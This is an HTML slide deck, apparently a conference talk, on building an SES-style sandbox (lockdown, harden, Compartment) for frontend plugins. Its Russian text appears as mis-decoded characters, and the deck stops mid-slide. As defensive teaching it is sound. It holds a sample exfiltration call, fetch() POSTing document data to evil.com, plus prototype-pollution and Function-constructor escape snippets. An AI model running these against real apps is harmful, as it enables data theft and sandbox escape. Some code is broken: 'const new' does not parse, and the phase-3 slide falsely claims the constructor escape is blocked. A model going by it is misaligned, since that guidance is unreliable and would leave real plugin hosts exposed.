<!doctype html>
<html lang="en">

<head>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Bitter:ital,wght@0,100..900;1,100..900&family=Manrope:wght@200..800&display=swap"
    rel="stylesheet">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

  <title>reveal.js</title>

  <link rel="stylesheet" href="dist/reset.css">
  <link rel="stylesheet" href="dist/reveal.css">
  <link rel="stylesheet" href="dist/theme/white.css">


  <!-- Theme used for syntax highlighted code -->
  <link rel="stylesheet" href="plugin/highlight/monokai.css">
</head>

<body>
  <div class="reveal">
    <div class="slides">
      <section>
        <h2>–ù–µ –±—Ä–∞—É–∑–µ—Ä–Ω—ã–µ, –∞ —Å–≤–æ–∏</h2>
        <p>–ø–∏—à–µ–º —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—É—é –ø–ª–∞–≥–∏–Ω–Ω—É—é —Å–∏—Å—Ç–µ–º—É –¥–ª—è —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è</p>
      </section>
      

      <!-- –ü—Ä–æ–±–ª–µ–º–∞ -->
      <section class="center">
        <h2>–ü—Ä–æ–±–ª–µ–º–∞</h2>
        <p class="emoji-big">üîå üí£</p>
        <p>–ö–∞–∫ –±–µ–∑–æ–ø–∞—Å–Ω–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å –∫–æ–¥ –ø–ª–∞–≥–∏–Ω–æ–≤,<br>–Ω–µ –¥–∞–≤–∞—è –∏–º –¥–æ—Å—Ç—É–ø –∫–æ –≤—Å–µ–º—É –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—é?</p>
      </section>

      <!-- –ü–ª–∞–≥–∏–Ω –ø—Ä–∏–º–µ—Ä -->
      <section data-transition="none">
        <h2>–ü–ª–∞–≥–∏–Ω</h2>
        <pre><code data-trim data-noescape>
function startPlugin(api) {
  console.log('Plugin started');
}

export default {
    // –¢–æ—á–∫–∞ –≤—Ö–æ–¥–∞ –≤ –ø–ª–∞–≥–∏–Ω
    onInit: startPlugin,
}
        </code></pre>
      </section>
      
      <section data-transition="none">
        <h2>–ü–ª–∞–≥–∏–Ω</h2>
        <pre><code data-trim data-noescape>
async function update(api){
  const old = await api
                     .document
                     .selection
                     .getSelectionAsText();

  const new = numbers2words(old) // –ª–æ–≥–∏–∫–∞ –ø–ª–∞–≥–∏–Ω–∞

  await api.document.insertContent(new);
}
        </code></pre>
      </section>
      
      <section data-transition="none">
        <h2>–ü–ª–∞–≥–∏–Ω</h2>
        <pre><code data-trim data-noescape>
function startPlugin(api) {
  api.ui.contextMenu.registerItems([{
      title: '–ü—Ä–æ–ø–∏—Å—å—é',
      onClick: update.call(this, api),
  }]);
}
        </code></pre>
      </section>

      <!-- –ß—Ç–æ –Ω–µ —Ç–∞–∫? -->
      <section class="center">
        <h2>–ß—Ç–æ –º–æ–∂–µ—Ç –ø–æ–π—Ç–∏ –Ω–µ —Ç–∞–∫?</h2>
        <pre><code class="javascript" data-trim>
// –ü–ª–∞–≥–∏–Ω –º–æ–∂–µ—Ç —É–∫—Ä–∞—Å—Ç—å –¥–∞–Ω–Ω—ã–µ:
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify(api.document.getAll())
});

// –ò–ª–∏ —Å–ª–æ–º–∞—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ:
Array.prototype.push = () => { throw new Error('üíÄ'); };

// –ò–ª–∏ –æ–±–æ–π—Ç–∏ –ª—é–±—É—é –∑–∞—â–∏—Ç—É:
(function(){}).constructor('return this')().document;
        </code></pre>
      </section>

      <!-- –ü–æ–¥—Ö–æ–¥—ã -->
      <section data-background="#1a1a2e">
        <h2 class="center">1. –°—É—â–µ—Å—Ç–≤—É—é—â–∏–µ –ø–æ–¥—Ö–æ–¥—ã</h2>
      </section>

      <section>
        <h3>Web Workers</h3>
        <pre><code class="javascript" data-trim>
const worker = new Worker('plugin.js');
worker.postMessage({ command: 'process', data: text });
worker.onmessage = (e) => console.log(e.data);
        </code></pre>
        <p class="pros">‚úì –ò–∑–æ–ª—è—Ü–∏—è –ø–æ—Ç–æ–∫–æ–≤</p>
        <p class="pros">‚úì –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –æ–±–º–µ–Ω —Å–æ–æ–±—â–µ–Ω–∏—è–º–∏</p>
        <p class="cons">‚úó –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ DOM</p>
        <p class="cons">‚úó –°–ª–æ–∂–Ω–∞—è –∫–æ–º–º—É–Ω–∏–∫–∞—Ü–∏—è</p>
        <p class="cons">‚úó –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞</p>
      </section>

      <section>
        <h3>Iframe Sandbox</h3>
        <pre><code class="html" data-trim>
<iframe sandbox="allow-scripts" src="plugin.html"></iframe>
        </code></pre>
        <p class="pros">‚úì –°–∏–ª—å–Ω–∞—è –∏–∑–æ–ª—è—Ü–∏—è</p>
        <p class="pros">‚úì –ö–æ–Ω—Ç—Ä–æ–ª—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π</p>
        <p class="cons">‚úó –¢—è–∂–µ–ª–æ–≤–µ—Å–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ</p>
        <p class="cons">‚úó –°–ª–æ–∂–Ω—ã–π API –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è</p>
        <p class="cons">‚úó –ü—Ä–æ–±–ª–µ–º—ã —Å –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å—é</p>
      </section>

      <section>
        <h3>VM / vm2 (Node.js)</h3>
        <pre><code class="javascript" data-trim>
const { VM } = require('vm2');
const vm = new VM({ sandbox: { api } });
vm.run('api.log("Hello")');
        </code></pre>
        <p class="pros">‚úì –ü—Ä–æ—Å—Ç–æ–π API</p>
        <p class="cons">‚úó –¢–æ–ª—å–∫–æ –¥–ª—è Node.js</p>
        <p class="cons">‚úó –£—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ –ø—Ä–æ—à–ª–æ–º</p>
        <p class="cons">‚úó –ü—Ä–æ–µ–∫—Ç –∑–∞–±—Ä–æ—à–µ–Ω (2023)</p>
      </section>

      <!-- –ò–¥–µ–∏, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –ø–æ–Ω—Ä–∞–≤–∏–ª–∏—Å—å -->
      <section data-background="#1a1a2e">
        <h2 class="center">2. –ò–¥–µ–∏, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –ø–æ–Ω—Ä–∞–≤–∏–ª–∏—Å—å</h2>
      </section>

      <section>
        <h3>Proxy –¥–ª—è –≥–ª–æ–±–∞–ª—å–Ω—ã—Ö –æ–±—ä–µ–∫—Ç–æ–≤</h3>
        <pre><code class="javascript" data-trim>
const safeWindow = new Proxy(window, {
  get(target, prop) {
    if (prop === 'fetch') return undefined;
    return target[prop];
  }
});
        </code></pre>
        <p class="cons">‚úó –õ–µ–≥–∫–æ –æ–±–æ–π—Ç–∏ —á–µ—Ä–µ–∑ –ø—Ä–æ—Ç–æ—Ç–∏–ø—ã</p>
        <p class="cons">‚úó –ù–µ –∑–∞—â–∏—â–∞–µ—Ç –æ—Ç –≤—Å–µ—Ö –∞—Ç–∞–∫</p>
        <p class="cons">‚úó –ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å</p>
      </section>

      <section>
        <h3>–°—Ç–∞—Ç–∏—á–µ—Å–∫–∏–π –∞–Ω–∞–ª–∏–∑ –∫–æ–¥–∞</h3>
        <pre><code class="javascript" data-trim>
function isSafe(code) {
  return !code.includes('fetch') && 
         !code.includes('eval') &&
         !code.includes('Function');
}
        </code></pre>
        <p class="cons">‚úó –õ–µ–≥–∫–æ –æ–±–æ–π—Ç–∏ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–µ–π</p>
        <p class="cons">‚úó –ú–Ω–æ–≥–æ –ª–æ–∂–Ω—ã—Ö —Å—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏–π</p>
        <p class="cons">‚úó –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –ø—Ä–µ–¥—É—Å–º–æ—Ç—Ä–µ—Ç—å –≤—Å—ë</p>
      </section>

      <section>
        <h3>CSP (Content Security Policy)</h3>
        <pre><code class="html" data-trim>
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self'">
        </code></pre>
        <p class="pros">‚úì –ó–∞—â–∏—Ç–∞ –æ—Ç XSS</p>
        <p class="cons">‚úó –ù–µ –∑–∞—â–∏—â–∞–µ—Ç –æ—Ç prototype pollution</p>
        <p class="cons">‚úó –ë–ª–æ–∫–∏—Ä—É–µ—Ç –≤–µ—Å—å –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–π –∫–æ–¥</p>
        <p class="cons">‚úó –°–ª–∏—à–∫–æ–º –≥—Ä—É–±—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –ø–ª–∞–≥–∏–Ω–æ–≤</p>
      </section>

      <!-- –ü–∏—à–µ–º —Å–∞–º–∏ -->
      <section data-background="#1a1a2e">
        <h2 class="center">3. –ü–∏—à–µ–º —Å–∞–º–∏: 4 —Ñ–∞–∑—ã –∑–∞—â–∏—Ç—ã</h2>
      </section>

      <!-- –§–∞–∑–∞ 1 -->
      <section>
        <h2>–§–∞–∑–∞ 1: –ë–∞–∑–æ–≤—ã–π Lockdown</h2>
        <h3>–ü—Ä–æ–±–ª–µ–º–∞: Prototype Pollution</h3>
        <p>–ö–æ–¥ –º–æ–∂–µ—Ç –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ç–æ—Ç–∏–ø—ã –∏ –≤–ª–∏—è—Ç—å –Ω–∞ –¥—Ä—É–≥–æ–π –∫–æ–¥</p>
      </section>

      <section>
        <h3>–ê—Ç–∞–∫–∞ —á–µ—Ä–µ–∑ –ø—Ä–æ—Ç–æ—Ç–∏–ø—ã</h3>
        <pre><code class="javascript" data-trim>
// –ê—Ç–∞–∫–∞ –î–û lockdown:
Array.prototype.push = function() { 
    console.log('üíÄ Hacked!'); 
};

[].push(1); // üíÄ Hacked!

// –í—Å–µ –º–∞—Å—Å–∏–≤—ã –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ —Ç–µ–ø–µ—Ä—å —Å–ª–æ–º–∞–Ω—ã!
const data = [];
data.push(5); // üíÄ Hacked!
        </code></pre>
      </section>

      <section>
        <h3>–†–µ—à–µ–Ω–∏–µ: –ó–∞–º–æ—Ä–æ–∑–∫–∞ –ø—Ä–æ—Ç–æ—Ç–∏–ø–æ–≤</h3>
        <pre><code class="javascript" data-trim>
function lockdownPhase1() {
    const intrinsics = [
        Object.prototype,
        Array.prototype,
        Function.prototype,
        String.prototype,
        Number.prototype,
        Boolean.prototype,
        Promise.prototype,
        RegExp.prototype,
        Date.prototype,
        Error.prototype,
    ];

    intrinsics.forEach(proto => {
        Object.freeze(proto);
    });

    console.log('‚úì –§–∞–∑–∞ 1: –ü—Ä–æ—Ç–æ—Ç–∏–ø—ã –∑–∞–º–æ—Ä–æ–∂–µ–Ω—ã');
}
        </code></pre>
      </section>

      <section>
        <h3>–†–µ–∑—É–ª—å—Ç–∞—Ç –§–∞–∑—ã 1</h3>
        <pre><code class="javascript" data-trim>
lockdownPhase1();

// –ü–û–°–õ–ï lockdown –∞—Ç–∞–∫–∞ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç:
try {
    Array.prototype.push = function() { 
        console.log('üíÄ Hacked!'); 
    };
} catch (e) {
    console.log('‚úì –ê—Ç–∞–∫–∞ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞:', e.message);
}

[].push(1); // —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–æ—Ä–º–∞–ª—å–Ω–æ
        </code></pre>
      </section>

      <!-- –§–∞–∑–∞ 2 -->
      <section>
        <h2>–§–∞–∑–∞ 2: Harden</h2>
        <h3>–ü—Ä–æ–±–ª–µ–º–∞: –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è –æ–±—ä–µ–∫—Ç–æ–≤</h3>
        <p>–î–∞–∂–µ –µ—Å–ª–∏ –ø—Ä–æ—Ç–æ—Ç–∏–ø—ã –∑–∞–º–æ—Ä–æ–∂–µ–Ω—ã, —Å–∞–º–∏ –æ–±—ä–µ–∫—Ç—ã –º–æ–∂–Ω–æ –∏–∑–º–µ–Ω—è—Ç—å</p>
      </section>

      <section>
        <h3>–ê—Ç–∞–∫–∞ –Ω–∞ –æ–±—ä–µ–∫—Ç</h3>
        <pre><code class="javascript" data-trim>
const counter = {
    count: 0,
    increment() { return ++this.count; }
};

console.log(counter.increment()); // 1

// –ê—Ç–∞–∫–∞ - –∑–∞–º–µ–Ω–∞ –º–µ—Ç–æ–¥–∞
counter.increment = function() { 
    console.log('üíÄ –í–∑–ª–æ–º–∞–Ω!'); 
    return 999; 
};

console.log(counter.increment()); // üíÄ –í–∑–ª–æ–º–∞–Ω! 999
        </code></pre>
      </section>

      <section>
        <h3>–†–µ—à–µ–Ω–∏–µ: –ì–ª—É–±–æ–∫–∞—è –∑–∞–º–æ—Ä–æ–∑–∫–∞</h3>
        <pre><code class="javascript" data-trim>
function harden(object) {
    const visited = new WeakSet();

    function hardenInternal(obj) {
        if (obj === null || typeof obj !== 'object') return obj;
        if (visited.has(obj)) return obj;
        
        visited.add(obj);

        // –†–µ–∫—É—Ä—Å–∏–≤–Ω–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Å–≤–æ–π—Å—Ç–≤–∞
        Object.getOwnPropertyNames(obj).forEach(name => {
            const value = obj[name];
            if (typeof value === 'object' && value !== null) {
                hardenInternal(value);
            }
        });

        // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –ø—Ä–æ—Ç–æ—Ç–∏–ø
        const proto = Object.getPrototypeOf(obj);
        if (proto !== null) {
            hardenInternal(proto);
        }

        Object.freeze(obj);
        return obj;
    }

    return hardenInternal(object);
}
        </code></pre>
      </section>

      <section>
        <h3>–†–µ–∑—É–ª—å—Ç–∞—Ç –§–∞–∑—ã 2</h3>
        <pre><code class="javascript" data-trim>
const safeCounter = harden({
    count: 0,
    increment() { return ++this.count; }
});

console.log(safeCounter.increment()); // 1

try {
    safeCounter.increment = function() { 
        console.log('üíÄ –í–∑–ª–æ–º–∞–Ω!'); 
    };
} catch (e) {
    console.log('‚úì –ê—Ç–∞–∫–∞ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞');
}

// –û–±—ä–µ–∫—Ç –æ—Å—Ç–∞–µ—Ç—Å—è –Ω–µ–∏–∑–º–µ–Ω–Ω—ã–º
        </code></pre>
      </section>

      <!-- –§–∞–∑–∞ 3 -->
      <section>
        <h2>–§–∞–∑–∞ 3: –ó–∞—â–∏—Ç–∞ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä–æ–≤</h2>
        <h3>–ü—Ä–æ–±–ª–µ–º–∞: –û–±—Ö–æ–¥ —á–µ—Ä–µ–∑ Constructor</h3>
        <p>–ß–µ—Ä–µ–∑ Function.prototype.constructor –º–æ–∂–Ω–æ –æ–±–æ–π—Ç–∏ –∏–∑–æ–ª—è—Ü–∏—é</p>
      </section>

      <section>
        <h3>–ê—Ç–∞–∫–∞ —á–µ—Ä–µ–∑ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä</h3>
        <pre><code class="javascript" data-trim>
// –ü–æ–ª—É—á–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –≥–ª–æ–±–∞–ª—å–Ω–æ–º—É scope
function escape() {
    const GlobalEval = (function(){})
        .constructor('return this')()
        .eval;
    return GlobalEval;
}

// –¢–µ–ø–µ—Ä—å –º–æ–∂–µ–º –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ª—é–±–æ–π –∫–æ–¥!
const realEval = escape();
realEval('console.log("–û–±—Ö–æ–¥ –∏–∑–æ–ª—è—Ü–∏–∏!")');
        </code></pre>
      </section>

      <section>
        <h3>–†–µ—à–µ–Ω–∏–µ: –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä–æ–≤</h3>
        <pre><code class="javascript" data-trim>
function lockdownPhase3() {
    // –ó–∞–º–æ—Ä–∞–∂–∏–≤–∞–µ–º –ø—Ä–æ—Ç–æ—Ç–∏–ø—ã
    [Object.prototype, Array.prototype, 
     Function.prototype, String.prototype]
        .forEach(proto => Object.freeze(proto));

    // –°–æ–∑–¥–∞–µ–º –±–µ–∑–æ–ø–∞—Å–Ω—É—é –æ–±–µ—Ä—Ç–∫—É –¥–ª—è Function
    const OriginalFunction = Function;
    const safeFunction = new Proxy(OriginalFunction, {
        construct() {
            throw new TypeError(
                'Function() –∑–∞–ø—Ä–µ—â–µ–Ω –ø–æ—Å–ª–µ lockdown'
            );
        },
        apply() {
            throw new TypeError(
                'Function() –∑–∞–ø—Ä–µ—â–µ–Ω –ø–æ—Å–ª–µ lockdown'
            );
        }
    });

    globalThis.Function = safeFunction;
}
        </code></pre>
      </section>

      <section>
        <h3>–†–µ–∑—É–ª—å—Ç–∞—Ç –§–∞–∑—ã 3</h3>
        <pre><code class="javascript" data-trim>
lockdownPhase3();

try {
    const bad = (function(){})
        .constructor('return this');
    console.log('–û–±—Ö–æ–¥ –Ω–µ —É–¥–∞–ª—Å—è');
} catch (e) {
    console.log('‚úì –û–±—Ö–æ–¥ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω:', e.message);
    // TypeError: Function() –∑–∞–ø—Ä–µ—â–µ–Ω –ø–æ—Å–ª–µ lockdown
}
        </code></pre>
      </section>

      <!-- –§–∞–∑–∞ 4 -->
      <section>
        <h2>–§–∞–∑–∞ 4: Compartment</h2>
        <h3>–ü—Ä–æ–±–ª–µ–º–∞: –ü–æ–ª–Ω–∞—è –∏–∑–æ–ª—è—Ü–∏—è</h3>
        <p>–ù—É–∂–Ω–∞ –∏–∑–æ–ª—è—Ü–∏—è –∫–æ–¥–∞ —Å –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –¥–æ—Å—Ç—É–ø–∞ –∫ –≥–ª–æ–±–∞–ª—å–Ω—ã–º –æ–±—ä–µ–∫—Ç–∞–º</p>
      </section>

      <section>
        <h3>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è Compartment</h3>
        <pre><code class="javascript" data-trim>
class Compartment {
    constructor(endowments = {}) {
        this.globalObject = Object.create(null);

        const safeIntrinsics = {
            Object, Array, String, Number,
            Boolean, Math, JSON, Promise
        };

        Object.assign(this.globalObject, 
                     safeIntrinsics, endowments);
        Object.freeze(this.globalObject);
    }

    evaluate(code) {
        const scopeProxy = new Proxy(this.globalObject, {
            has() { return true; },
            get(target, prop) {
                if (prop === 'window' || 
                    prop === 'document' || 
                    prop === 'globalThis') {
                    return undefined;
                }
                return target[prop];
            }
        });

        const scopedEval = new Function('scope', 
            'with (scope) { return eval(arguments[1]); }'
        );

        return scopedEval(scopeProxy, code);
    }
}
        </code></pre>
      </section>

      <section>
        <h3>–ò–∑–æ–ª—è—Ü–∏—è –¥–æ—Å—Ç—É–ø–∞</h3>
        <pre><code class="javascript" data-trim>
const compartment = new Compartment();

// window –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω
const result = compartment.evaluate('typeof window');
console.log(result); // "undefined"

// document –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω
const result2 = compartment.evaluate('typeof document');
console.log(result2); // "undefined"

// fetch –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω
const result3 = compartment.evaluate('typeof fetch');
console.log(result3); // "undefined"
        </code></pre>
      </section>

      <section>
        <h3>–ò–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ã</h3>
        <pre><code class="javascript" data-trim>
// –ö–∞–∂–¥—ã–π compartment –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω
const compartmentA = new Compartment({ 
    name: 'Alice', 
    secret: 'A123' 
});

const compartmentB = new Compartment({ 
    name: 'Bob', 
    secret: 'B456' 
});

console.log(
    compartmentA.evaluate('name + ": " + secret')
); // "Alice: A123"

console.log(
    compartmentB.evaluate('name + ": " + secret')
); // "Bob: B456"
        </code></pre>
      </section>

      <!-- –ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å -->
      <section data-background="#1a1a2e">
        <h2 class="center">4. –ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å</h2>
      </section>

      <section>
        <h3>–ù–∞–∫–ª–∞–¥–Ω—ã–µ —Ä–∞—Å—Ö–æ–¥—ã</h3>
        <ul>
          <li><strong>Object.freeze()</strong> ‚Äî ~0.1-1 –º–∫—Å –Ω–∞ –æ–±—ä–µ–∫—Ç</li>
          <li><strong>Proxy –æ–±–µ—Ä—Ç–∫–∏</strong> ‚Äî 10-50% –∑–∞–º–µ–¥–ª–µ–Ω–∏–µ –æ–±—Ä–∞—â–µ–Ω–∏–π</li>
          <li><strong>with + eval</strong> ‚Äî 100-300% –∑–∞–º–µ–¥–ª–µ–Ω–∏–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è</li>
          <li><strong>–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Compartment</strong> ‚Äî 1-5 –º—Å</li>
        </ul>
      </section>

      <section>
        <h3>–û–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è</h3>
        <pre><code class="javascript" data-trim>
// ‚ùå –ü–ª–æ—Ö–æ: –∑–∞–º–æ—Ä–æ–∑–∫–∞ –ø—Ä–∏ –∫–∞–∂–¥–æ–º –≤—ã–∑–æ–≤–µ
function badAPI() {
  return Object.freeze({ method() {} });
}

// ‚úì –•–æ—Ä–æ—à–æ: –∑–∞–º–æ—Ä–æ–∑–∫–∞ –æ–¥–∏–Ω —Ä–∞–∑
const goodAPI = Object.freeze({
  method() {}
});

// ‚úì –ï—â—ë –ª—É—á—à–µ: –ø–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ compartment
const compartmentPool = new Map();
function getCompartment(pluginId) {
  if (!compartmentPool.has(pluginId)) {
    compartmentPool.set(pluginId, new Compartment());
  }
  return compartmentPool.get(pluginId);
}
        </code></pre>
      </section>

      <section>
        <h3>–ë–µ–Ω—á–º–∞—Ä–∫–∏ (–æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–µ)</h3>
        <pre><code class="plaintext" data-trim>
–ú–µ—Ç–æ–¥                    | –°–∫–æ—Ä–æ—Å—Ç—å | –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å
-------------------------|----------|-------------
–ù–∞—Ç–∏–≤–Ω—ã–π JavaScript      | 1.0x     | ‚ö†Ô∏è –ù–∏–∑–∫–∞—è
Proxy –∏–∑–æ–ª—è—Ü–∏—è           | 0.8x     | ‚ö†Ô∏è –°—Ä–µ–¥–Ω—è—è
SES Compartment          | 0.3x     | ‚úì –í—ã—Å–æ–∫–∞—è
Web Worker               | 0.1x     | ‚úì –û—á–µ–Ω—å –≤—ã—Å–æ–∫–∞—è
Iframe Sandbox           | 0.05x    | ‚úì –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è
        </code></pre>
        <p><small>* –°–∫–æ—Ä–æ—Å—Ç—å –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ –Ω–∞—Ç–∏–≤–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è</small></p>
      </section>

      <!-- –°—Ç–∞–Ω–¥–∞—Ä—Ç—ã -->
      <section data-background="#1a1a2e">
        <h2 class="center">5. –°—Ç–∞–Ω–¥–∞—Ä—Ç—ã –∏ —ç–∫–æ—Å–∏—Å—Ç–µ–º–∞</h2>
      </section>

      <section>
        <h3>SES Proposal (TC39)</h3>
        <ul>
          <li><strong>–°—Ç–∞—Ç—É—Å:</strong> Stage 2 –≤ TC39</li>
          <li><strong>–°–ø–æ–Ω—Å–æ—Ä—ã:</strong> Agoric, MetaMask, Google</li>
          <li><strong>–¶–µ–ª—å:</strong> –ù–∞—Ç–∏–≤–Ω–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞ –≤ ECMAScript</li>
        </ul>
        <pre><code class="javascript" data-trim>
// –ë—É–¥—É—â–∏–π —Å–∏–Ω—Ç–∞–∫—Å–∏—Å:
import { lockdown, Compartment } from 'ses';

lockdown();
const c = new Compartment({ api });
c.evaluate('api.doSomething()');
        </code></pre>
      </section>

      <section>
        <h3>–ë–∏–±–ª–∏–æ—Ç–µ–∫–∏ –∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã</h3>
        <ul>
          <li><strong>ses</strong> ‚Äî —Ä–µ—Ñ–µ—Ä–µ–Ω—Å–Ω–∞—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è (Agoric)</li>
          <li><strong>@endo/ses-ava</strong> ‚Äî —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å –∏–∑–æ–ª—è—Ü–∏–µ–π</li>
          <li><strong>LavaMoat</strong> ‚Äî –∑–∞—â–∏—Ç–∞ npm –ø–∞–∫–µ—Ç–æ–≤ (MetaMask)</li>
          <li><strong>Hardened JavaScript</strong> ‚Äî —ç–∫–æ—Å–∏—Å—Ç–µ–º–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</li>
        </ul>
        <pre><code class="bash" data-trim>
npm install ses
npm install lavamoat
        </code></pre>
      </section>

      <section>
        <h3>–ö—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç SES?</h3>
        <ul>
          <li><strong>Agoric</strong> ‚Äî –±–ª–æ–∫—á–µ–π–Ω-–ø–ª–∞—Ç—Ñ–æ—Ä–º–∞ –¥–ª—è —Å–º–∞—Ä—Ç-–∫–æ–Ω—Ç—Ä–∞–∫—Ç–æ–≤</li>
          <li><strong>MetaMask</strong> ‚Äî –∏–∑–æ–ª—è—Ü–∏—è —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–π –±—Ä–∞—É–∑–µ—Ä–∞</li>
          <li><strong>Google</strong> ‚Äî –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</li>
          <li><strong>Salesforce</strong> ‚Äî Locker Service –¥–ª—è Lightning Web Components</li>
        </ul>
      </section>

      <section>
        <h3>–û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∞</h3>
        <ul>
          <li>–ù–µ—Ç –Ω–∞—Ç–∏–≤–Ω–æ–π –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –≤ –±—Ä–∞—É–∑–µ—Ä–∞—Ö (–ø–æ–∫–∞)</li>
          <li>–¢—Ä–µ–±—É–µ—Ç –ø–æ–ª–∏—Ñ–∏–ª–ª–∞ (~50 –ö–ë)</li>
          <li>–ù–µ –∑–∞—â–∏—â–∞–µ—Ç –æ—Ç side-channel –∞—Ç–∞–∫</li>
          <li>–ù–µ –∑–∞–º–µ–Ω—è–µ—Ç CSP –∏ –¥—Ä—É–≥–∏–µ –º–µ—Ö–∞–Ω–∏–∑–º—ã</li>
          <li>–û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏</li>
        </ul>
      </section>

      <!-- –í—ã–≤–æ–¥—ã -->
      <section data-background="#1a1a2e">
        <h2 class="center">6. –í—ã–≤–æ–¥—ã</h2>
      </section>

      <section>
        <h2>–ò—Ç–æ–≥–∏: 4 —Ñ–∞–∑—ã –∑–∞—â–∏—Ç—ã</h2>
        <ul>
          <li><strong>–§–∞–∑–∞ 1: Lockdown</strong> ‚Äî –∑–∞—â–∏—Ç–∞ –æ—Ç prototype pollution</li>
          <li><strong>–§–∞–∑–∞ 2: Harden</strong> ‚Äî –≥–ª—É–±–æ–∫–∞—è –∑–∞–º–æ—Ä–æ–∑–∫–∞ –æ–±—ä–µ–∫—Ç–æ–≤</li>
          <li><strong>–§–∞–∑–∞ 3: –ó–∞—â–∏—Ç–∞ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä–æ–≤</strong> ‚Äî –∑–∞–∫—Ä—ã—Ç–∏–µ escape hatches</li>
          <li><strong>–§–∞–∑–∞ 4: Compartment</strong> ‚Äî –ø–æ–ª–Ω–∞—è –∏–∑–æ–ª—è—Ü–∏—è –∫–æ–¥–∞</li>
        </ul>
      </section>

      <section>
        <h2>–ö–æ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å SES?</h2>
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;">
          <div>
